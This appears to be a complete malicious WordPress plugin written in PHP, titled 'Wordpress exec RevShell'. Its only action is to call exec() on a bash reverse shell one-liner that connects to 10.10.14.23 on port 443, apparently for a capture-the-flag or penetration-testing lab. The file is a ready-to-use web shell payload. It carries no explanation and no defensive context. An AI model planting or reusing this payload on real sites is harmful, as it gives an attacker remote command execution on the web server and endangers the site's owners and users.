<?php
/*
Plugin Name: Wordpress exec RevShell
Author: /wp-content/plugins/exec/exec.php
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/443 0>&1'")

?>